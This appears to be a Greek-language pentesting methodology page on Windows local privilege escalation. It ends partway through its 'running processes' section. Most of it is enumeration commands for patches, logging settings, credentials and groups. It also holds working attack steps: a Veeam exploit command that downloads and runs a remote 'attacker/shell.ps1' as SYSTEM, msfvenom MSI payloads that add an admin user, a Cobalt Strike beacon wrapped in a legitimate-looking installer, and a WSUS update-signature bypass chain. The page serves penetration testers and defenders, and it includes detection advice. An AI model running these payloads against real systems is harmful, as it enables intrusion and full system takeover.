# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Καλύτερο tool για την αναζήτηση vectors για Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Αυτή η σελίδα συγκεντρώνει τη γενική μεθοδολογία για Windows privilege escalation από αρκετούς βασικούς οδηγούς.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Η πρακτική ροή enumeration βασίζεται επίσης σε community workshops και checklists.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Το ιστορικό υλικό για attacks περιλαμβάνει την παρουσίαση του DerbyCon σχετικά με το Windows privilege escalation.<sup>[[5]](#references)</sup>

## Αρχική θεωρία των Windows

### Access Tokens

**Αν δεν γνωρίζεις τι είναι τα Windows access tokens, διάβασε την παρακάτω σελίδα πριν συνεχίσεις:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Δες την παρακάτω σελίδα για περισσότερες πληροφορίες σχετικά με τα ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Αν δεν γνωρίζεις τι είναι τα integrity levels στα Windows, διάβασε την παρακάτω σελίδα πριν συνεχίσεις:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Υπάρχουν διάφορα πράγματα στα Windows που θα μπορούσαν να **σε εμποδίσουν να κάνεις enumeration του συστήματος**, να εκτελέσεις executables ή ακόμη και να **εντοπίσουν τις δραστηριότητές σου**. Θα πρέπει να **διαβάσεις** την παρακάτω **σελίδα** και να κάνεις **enumeration** όλων αυτών των **μηχανισμών** **άμυνας** πριν ξεκινήσεις το privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Οι UIAccess processes που εκκινούνται μέσω του `RAiLaunchAdminProcess` μπορούν να γίνουν αντικείμενο abuse για την επίτευξη High IL χωρίς prompts, όταν παρακάμπτονται οι secure-path checks του AppInfo. Δες εδώ το ειδικό workflow για UIAccess/Admin Protection bypass:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Η propagation του Secure Desktop accessibility registry μπορεί να γίνει αντικείμενο abuse για arbitrary SYSTEM registry write (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Τα πρόσφατα Windows builds εισήγαγαν επίσης ένα **SMB arbitrary-port** LPE path, όπου ένα privileged local NTLM authentication γίνεται reflect μέσω μιας reused SMB TCP connection:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Πληροφορίες συστήματος

### Enumeration πληροφοριών έκδοσης

Έλεγξε αν η έκδοση των Windows περιέχει κάποια γνωστή vulnerability (έλεγξε επίσης τα patches που έχουν εφαρμοστεί).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits εκδόσεων

Αυτός ο [site](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμος για την αναζήτηση λεπτομερών πληροφοριών σχετικά με τις ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων περιέχει περισσότερες από 4.700 ευπάθειες ασφαλείας, δείχνοντας το **τεράστιο attack surface** που παρουσιάζει ένα περιβάλλον Windows.

**Στο σύστημα**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Το Winpeas έχει ενσωματωμένο το watson)_

**Τοπικά με πληροφορίες συστήματος**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub repos των exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Περιβάλλον

Υπάρχουν credential/Juicy info αποθηκευμένα στις env variables;
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Ιστορικό PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Αρχεία Transcript του PowerShell

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε στη διεύθυνση [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Οι λεπτομέρειες των εκτελέσεων του pipeline του PowerShell καταγράφονται, συμπεριλαμβανομένων των εκτελεσμένων εντολών, των invocations εντολών και τμημάτων των scripts. Ωστόσο, ενδέχεται να μην καταγράφονται οι πλήρεις λεπτομέρειες εκτέλεσης και τα αποτελέσματα εξόδου.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες στην ενότητα "Transcript files" της τεκμηρίωσης, επιλέγοντας **"Module Logging"** αντί για **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Για να προβάλετε τα τελευταία 15 συμβάντα από τα logs του PowersShell, μπορείτε να εκτελέσετε:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Καταγράφεται ένα πλήρες αρχείο δραστηριότητας και όλο το περιεχόμενο της εκτέλεσης του script, διασφαλίζοντας ότι κάθε block κώδικα τεκμηριώνεται καθώς εκτελείται. Αυτή η διαδικασία διατηρεί ένα ολοκληρωμένο audit trail κάθε δραστηριότητας, πολύτιμο για forensics και την ανάλυση κακόβουλης συμπεριφοράς. Με την τεκμηρίωση όλης της δραστηριότητας κατά τον χρόνο εκτέλεσης, παρέχονται λεπτομερείς πληροφορίες για τη διαδικασία.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Τα συμβάντα καταγραφής για το Script Block μπορούν να εντοπιστούν στο Windows Event Viewer, στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να προβάλετε τα 20 τελευταία συμβάντα, μπορείτε να χρησιμοποιήσετε:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ρυθμίσεις Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Μονάδες δίσκου
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Μπορείτε να παραβιάσετε το σύστημα αν οι ενημερώσεις δεν ζητούνται μέσω http**S**, αλλά μέσω http.

Ξεκινάτε ελέγχοντας αν το δίκτυο χρησιμοποιεί ενημέρωση WSUS χωρίς SSL, εκτελώντας τα παρακάτω στο cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ή τα ακόλουθα σε PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Αν λάβετε μια απάντηση όπως μία από τις παρακάτω:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Και αν το `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή το `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ισούται με `1`.

Τότε, **είναι exploitable.** Αν η τελευταία registry τιμή ισούται με 0, η καταχώριση WSUS θα αγνοηθεί.

Για να εκμεταλλευτείτε αυτές τις ευπάθειες, μπορείτε να χρησιμοποιήσετε εργαλεία όπως: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Πρόκειται για weaponized exploit scripts τύπου MiTM, τα οποία εισάγουν «ψεύτικες» updates σε μη-SSL WSUS traffic.

Διαβάστε την έρευνα εδώ:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Διαβάστε την πλήρη αναφορά εδώ**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Βασικά, αυτό είναι το flaw που εκμεταλλεύεται αυτό το bug:

> Αν έχουμε τη δυνατότητα να τροποποιήσουμε το local user proxy μας και το Windows Updates χρησιμοποιεί το proxy που έχει ρυθμιστεί στις ρυθμίσεις του Internet Explorer, τότε έχουμε τη δυνατότητα να εκτελέσουμε τοπικά το [PyWSUS](https://github.com/GoSecure/pywsus) για να υποκλέψουμε το δικό μας traffic και να εκτελέσουμε code ως elevated user στο asset μας.
>
> Επιπλέον, καθώς η WSUS service χρησιμοποιεί τις ρυθμίσεις του τρέχοντος user, θα χρησιμοποιήσει επίσης το certificate store του. Αν δημιουργήσουμε ένα self-signed certificate για το WSUS hostname και προσθέσουμε αυτό το certificate στο certificate store του τρέχοντος user, θα μπορούμε να υποκλέψουμε τόσο HTTP όσο και HTTPS WSUS traffic. Το WSUS δεν χρησιμοποιεί μηχανισμούς τύπου HSTS για να υλοποιήσει validation τύπου trust-on-first-use στο certificate. Αν το certificate που παρουσιάζεται είναι trusted από τον user και έχει το σωστό hostname, θα γίνει αποδεκτό από τη service.

Μπορείτε να εκμεταλλευτείτε αυτή την ευπάθεια χρησιμοποιώντας το εργαλείο [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (μόλις δημοσιοποιηθεί).

### Κατάχρηση custom updates του SUSDB: unsigned payloads μέσω `.txt`/`.esd`

Αυτή είναι μια διαφορετική αποτυχία του trust boundary από την υποκλοπή μιας HTTP WSUS connection: προϋπόθεση είναι να υπάρχει επαρκής πρόσβαση στα **stored procedures της WSUS database (`SUSDB`)** για τη δημοσίευση και την έγκριση ενός custom update. Μια πρακτική entry path είναι η μεταβίβαση μέσω relay του computer account ενός upstream WSUS σε ξεχωριστό MSSQL server που φιλοξενεί το `SUSDB`. Η ακριβής προϋπόθεση εξαρτάται από το deployment, επομένως πρώτα enumeratε τα `EXECUTE` permissions αντί να υποθέσετε δικαιώματα SQL administrator.<sup>[[38]](#references)[[39]](#references)</sup>

Για τη ξεχωριστή attack path που μεταφέρει μέσω relay το WSUS client authentication από HTTP/8530 σε LDAP, SMB ή AD CS, δείτε το [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Build, target και approve του update

Το custom-update workflow χρησιμοποιεί legitimate WSUS procedures ως restricted publishing API. Οι σημαντικότερες state transitions είναι οι εξής:<sup>[[38]](#references)</sup>

| Stage | Relevant stored procedures |
| --- | --- |
| Import update metadata | `spImportUpdate` |
| Store prerequisite, localized and extended XML fragments | `spSaveXMLFragment` |
| Associate the content digest with its attacker-controlled URL | `spSetBatchURL` |
| Enumerate/create a computer group and add the client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Approve installation for that group | `spDeployUpdate` with `@actionID = 0` and `@isAssigned = 1` |

Το file name, τα digests, το size και ο `CommandLineInstallation` handler πρέπει να συμφωνούν στα imported metadata/fragments. Μετά την ανάθεση του content URL και του target group, η τελική έγκριση μοιάζει με την παρακάτω· χρησιμοποιήστε νέα update, group και deployment identifiers αντί να επαναχρησιμοποιήσετε τα example GUIDs.<sup>[[38]](#references)[[39]](#references)</sup>
```sql
EXEC spDeployUpdate
@updateID = '<update-guid>', @revisionNumber = 1,
@actionID = 0, @targetGroupID = '<group-guid>',
@isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
@adminName = 'Administrator';
```
#### Παράκαμψη υπογραφής μέσω extension

Το WSUS κανονικά απορρίπτει αυθαίρετο unsigned εκτελέσιμο περιεχόμενο. Ωστόσο, στο `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, η διαδρομή `.NET` `VerifyFile` ορίζει το flag ελέγχου certificate σε false όταν το παρεχόμενο filename τελειώνει σε `.txt` ή `.esd`· στη συνέχεια παραλείπεται το `CheckCertificateSignature`, χωρίς να έχει προηγουμένως αποδειχθεί ότι τα bytes είναι text ή νόμιμο ESD image. Επομένως, ένα αμετάβλητο PE με όνομα, για παράδειγμα, `payload.exe.txt`, μπορεί να περάσει την επαλήθευση περιεχομένου και αργότερα να εκτελεστεί από τον command-line installation handler του update. Πρόκειται για bug policy/type-confusion και όχι για πλαστογράφηση signature.<sup>[[39]](#references)</sup>
```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
checkSignature = false;
if (checkSignature)
CheckCertificateSignature(/* downloaded file */);
```
#### Staging και automation συμβατά με BITS

Η κλήση του `spDeployUpdate` κάνει το WSUS να ανακτήσει το καταχωρισμένο περιεχόμενο. Το origin πρέπει να ικανοποιεί τις απαιτήσεις HTTP του BITS: ένα προσβάσιμο URL από μόνο του δεν επαρκεί, επειδή η μεταφορά χρησιμοποιεί αρχική ροή `HEAD`/`GET` και αιτήματα byte-range. Ένας server χωρίς υποστήριξη Range προκαλεί το WSUS synchronization `EventId=364`, δηλώνοντας ότι το BITS απαιτεί το Range protocol header.<sup>[[39]](#references)</sup>

Το research PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) δημιουργεί το SQL που απαιτείται για την αλυσίδα import/fragment/URL/group/deployment, περιλαμβάνει έναν τροποποιημένο MSSQL client για την εκτέλεσή του και παρέχει το `BitsWebServer.py` για content staging. Μια ελάχιστη κλήση σε εξουσιοδοτημένο lab είναι:<sup>[[40]](#references)</sup>
```bash
python3 NotWSUSpicious.py \
--wsusHostname wsus.lab.local \
--updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
--updateName SecurityUpdate \
--updateFilePath /payloads/payload.exe.txt \
--updateArguments '' \
--computerGroup TestGroup \
--targetComputer workstation.lab.local
python3 BitsWebServer.py
```
#### Unattended execution and retry persistence

Η client-side interaction εξαρτάται από την policy. Η επιλογή `4 - Auto download and schedule install` στη διαδρομή `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` κάνει ένα approved update να γίνεται download και install στο configured schedule, χωρίς ο χρήστης να το επιλέξει χειροκίνητα. Κατά τις δοκιμές, ένα payload του οποίου το update παρέμενε failed/incomplete προσφερόταν ξανά αμέσως μετά την έξοδο της callback process, επομένως η συμπεριφορά retry μπορεί να μετατραπεί σε recurring execution persistence· είναι noisy επειδή ο client εμφανίζει κατάσταση update-failed.<sup>[[39]](#references)</sup>

#### Detection and hardening pivots

Χρήσιμα server- και client-side pivots από αυτή την αλυσίδα είναι:<sup>[[39]](#references)</sup>

- Κάντε audit στην εκτέλεση των `spCreateTargetGroup`, `spSetBatchURL` και `spDeployUpdate` στο `SUSDB`· διερευνήστε νέα targeting groups, external content origins, `.txt`/`.esd` update payloads και deployments που εκτελούνται από μη αναμενόμενα principals (ιδίως non-computer accounts).
- Ελέγξτε το `C:\Program Files\Update Services\LogFiles` για `ContentSyncAgent`, `FileVerified`, το ανορθόγραφο `FileVerficationFailed` και `EventId=364`· συσχετίστε τη verification με το payload extension και το content magic αντί να εμπιστεύεστε το suffix.
- Αναζητήστε Windows Update installation που αποτυγχάνει/επαναλαμβάνεται συνεχώς και PE execution ή μη αναμενόμενη child/network activity από content που φέρει ονόματα `.txt` ή `.esd`.
- Απαιτήστε Extended Protection for Authentication στη database service όπου υποστηρίζεται και περιορίστε την πρόσβαση στο database network στον WSUS server και σε authorized administrative systems. Ελαχιστοποιήστε και κάντε audit στα `EXECUTE` rights των custom-update procedures.

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Πολλά enterprise agents εκθέτουν localhost IPC surface και ένα privileged update channel. Αν το enrollment μπορεί να εξαναγκαστεί σε attacker server και ο updater εμπιστεύεται rogue root CA ή weak signer checks, ένας local user μπορεί να παραδώσει ένα malicious MSI που εγκαθίσταται από την SYSTEM service. Δείτε μια generalized technique (βασισμένη στην αλυσίδα Netskope stAgentSvc – CVE-2025-0309) εδώ:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Το Veeam B&R < `11.0.1.1261` εκθέτει μια localhost service στη **TCP/9401**, η οποία επεξεργάζεται attacker-controlled messages, επιτρέποντας arbitrary commands ως **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: επιβεβαιώστε τον listener και την έκδοση, π.χ. `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: τοποθετήστε ένα PoC όπως το `VeeamHax.exe` μαζί με τα απαιτούμενα Veeam DLLs στον ίδιο κατάλογο και, στη συνέχεια, ενεργοποιήστε ένα SYSTEM payload μέσω του local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Η υπηρεσία εκτελεί την εντολή ως SYSTEM.
## KrbRelayUp

Υπάρχει μια ευπάθεια **local privilege escalation** σε Windows **domain** περιβάλλοντα υπό συγκεκριμένες συνθήκες. Αυτές οι συνθήκες περιλαμβάνουν περιβάλλοντα όπου το **LDAP signing** δεν επιβάλλεται, οι χρήστες διαθέτουν δικαιώματα self-rights που τους επιτρέπουν να ρυθμίζουν το **Resource-Based Constrained Delegation (RBCD)** και υπάρχει η δυνατότητα οι χρήστες να δημιουργούν υπολογιστές μέσα στο domain. Είναι σημαντικό να σημειωθεί ότι αυτές οι **απαιτήσεις** ικανοποιούνται με τις **προεπιλεγμένες ρυθμίσεις**.

Βρείτε το **exploit στο** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης, δείτε [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Αν** αυτά τα 2 registry keys είναι **ενεργοποιημένα** (η τιμή είναι **0x1**), τότε οι χρήστες με οποιοδήποτε privilege μπορούν να **εγκαταστήσουν** (να εκτελέσουν) αρχεία `*.msi` ως NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```
Εάν έχετε ένα meterpreter session, μπορείτε να αυτοματοποιήσετε αυτή την τεχνική χρησιμοποιώντας το module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το power-up για να δημιουργήσετε μέσα στον τρέχοντα κατάλογο ένα Windows MSI binary για την κλιμάκωση προνομίων. Αυτό το script εγγράφει ένα προμεταγλωττισμένο MSI installer που ζητά την προσθήκη user/group (επομένως θα χρειαστείτε πρόσβαση GIU):
```
Write-UserAddMSI
```
Απλώς εκτελέστε το binary που δημιουργήθηκε για να κάνετε privilege escalation.

### MSI Wrapper

Διαβάστε αυτό το tutorial για να μάθετε πώς να δημιουργείτε ένα MSI wrapper χρησιμοποιώντας αυτά τα tools. Σημειώστε ότι μπορείτε να κάνετε wrap ένα αρχείο "**.bat**" αν **θέλετε απλώς** να **εκτελέσετε** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** με Cobalt Strike ή Metasploit ένα **νέο Windows EXE TCP payload** στο `C:\privesc\beacon.exe`
- Ανοίξτε το **Visual Studio**, επιλέξτε **Create a new project** και πληκτρολογήστε "installer" στο search box. Επιλέξτε το project **Setup Wizard** και κάντε κλικ στο **Next**.
- Δώστε στο project ένα όνομα, όπως **AlwaysPrivesc**, χρησιμοποιήστε το **`C:\privesc`** ως location, επιλέξτε **place solution and project in the same directory** και κάντε κλικ στο **Create**.
- Συνεχίστε να κάνετε κλικ στο **Next** μέχρι να φτάσετε στο βήμα 3 από 4 (choose files to include). Κάντε κλικ στο **Add** και επιλέξτε το Beacon payload που μόλις δημιουργήσατε. Στη συνέχεια κάντε κλικ στο **Finish**.
- Επισημάνετε το project **AlwaysPrivesc** στο **Solution Explorer** και, στο **Properties**, αλλάξτε το **TargetPlatform** από **x86** σε **x64**.
- Υπάρχουν και άλλες properties που μπορείτε να αλλάξετε, όπως τα **Author** και **Manufacturer**, ώστε η εγκατεστημένη εφαρμογή να φαίνεται πιο legitimate.
- Κάντε δεξί κλικ στο project και επιλέξτε **View > Custom Actions**.
- Κάντε δεξί κλικ στο **Install** και επιλέξτε **Add Custom Action**.
- Κάντε διπλό κλικ στο **Application Folder**, επιλέξτε το αρχείο **beacon.exe** και κάντε κλικ στο **OK**. Αυτό διασφαλίζει ότι το beacon payload θα εκτελείται αμέσως μόλις εκτελεστεί ο installer.
- Στο **Custom Action Properties**, αλλάξτε το **Run64Bit** σε **True**.
- Τέλος, κάντε **build**.
- Αν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιωθείτε ότι έχετε ορίσει την platform σε x64.

### MSI Installation

Για να εκτελέσετε την **εγκατάσταση** του malicious αρχείου `.msi` στο **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Για την εκμετάλλευση αυτής της ευπάθειας μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always_install_elevated_

## Antivirus και Detectors

### Ρυθμίσεις Audit

Αυτές οι ρυθμίσεις καθορίζουν τι **καταγράφεται**, επομένως θα πρέπει να δώσετε προσοχή
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Το Windows Event Forwarding είναι χρήσιμο για να γνωρίζουμε πού αποστέλλονται τα logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

Το **LAPS** έχει σχεδιαστεί για τη **διαχείριση κωδικών πρόσβασης τοπικών Administrator**, διασφαλίζοντας ότι κάθε κωδικός πρόσβασης είναι **μοναδικός, τυχαιοποιημένος και ενημερώνεται τακτικά** σε υπολογιστές που είναι συνδεδεμένοι σε domain. Αυτοί οι κωδικοί πρόσβασης αποθηκεύονται με ασφάλεια στο Active Directory και είναι προσβάσιμοι μόνο από χρήστες στους οποίους έχουν εκχωρηθεί επαρκή δικαιώματα μέσω ACLs, επιτρέποντάς τους να προβάλλουν τους κωδικούς πρόσβασης τοπικού admin, εφόσον είναι εξουσιοδοτημένοι.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Εάν είναι ενεργό, οι **κωδικοί πρόσβασης σε απλό κείμενο αποθηκεύονται στο LSASS** (Local Security Authority Subsystem Service).\
[**Περισσότερες πληροφορίες σχετικά με το WDigest σε αυτήν τη σελίδα**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Ξεκινώντας από τα **Windows 8.1**, η Microsoft εισήγαγε ενισχυμένη προστασία για το Local Security Authority (LSA), ώστε να **μπλοκάρει** προσπάθειες μη αξιόπιστων διεργασιών να **διαβάσουν τη μνήμη του** ή να εισάγουν κώδικα, ασφαλίζοντας περαιτέρω το σύστημα.\
[**Περισσότερες πληροφορίες σχετικά με το LSA Protection εδώ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

Το **Credential Guard** εισήχθη στα **Windows 10**. Σκοπός του είναι να προστατεύει τα διαπιστευτήρια που είναι αποθηκευμένα σε μια συσκευή από απειλές όπως οι επιθέσεις pass-the-hash. [**Περισσότερες πληροφορίες σχετικά με το Credential Guard είναι διαθέσιμες εδώ.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

Τα **διαπιστευτήρια domain** επικυρώνονται από την **Local Security Authority** (LSA) και χρησιμοποιούνται από στοιχεία του λειτουργικού συστήματος.\
[**Περισσότερες πληροφορίες για τα Cached Credentials εδώ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Χρήστες και Ομάδες

### Καταγραφή Χρηστών και Ομάδων

Θα πρέπει να ελέγξετε αν κάποια από τις ομάδες στις οποίες ανήκετε διαθέτει ενδιαφέροντα δικαιώματα
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

Αν **ανήκετε σε κάποια privileged group, ενδέχεται να μπορείτε να κάνετε privilege escalation**. Μάθετε περισσότερα για τις privileged groups και πώς να τις εκμεταλλευτείτε για privilege escalation εδώ:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Μάθετε περισσότερα** σχετικά με το τι είναι ένα **token** σε αυτήν τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Ελέγξτε την ακόλουθη σελίδα για να **μάθετε περισσότερα σχετικά με ενδιαφέροντα tokens** και πώς να τα εκμεταλλευτείτε:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Προσωπικοί φάκελοι
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Πολιτική κωδικών πρόσβασης
```bash
net accounts
```
### Λήψη του περιεχομένου του clipboard
```bash
powershell -command "Get-Clipboard"
```
## Εκτελούμενες Διεργασίες

### Δικαιώματα Αρχείων και Φακέλων

